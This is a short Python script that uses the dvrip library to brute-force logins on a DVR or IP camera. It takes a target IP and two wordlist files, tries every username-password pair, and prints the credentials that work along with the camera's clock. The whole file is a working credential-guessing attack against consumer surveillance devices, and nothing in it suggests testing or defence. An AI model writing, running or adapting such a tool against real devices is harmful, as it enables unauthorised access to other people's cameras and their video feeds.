import sys
import argparse
from dvrip import DVRIPCam
from time import sleep

host_ip = sys.argv[1]
file1 = open(sys.argv[2],'r')
logins = file1.read().splitlines()
file1.close()
file2 = open(sys.argv[3],'r')
passwords = file2.read().splitlines()
file2.close()

for i in logins:
    for p in passwords:
        cam = DVRIPCam(host_ip, user=i, password=p)
        # Attempt to log in
        if cam.login():
            print("Success creds: {0}:{1}".format(i,p))
            print("Camera time:", cam.get_time())
            cam.close()
        else:
            print("Wrong creds: {0}:{1}".format(i,p))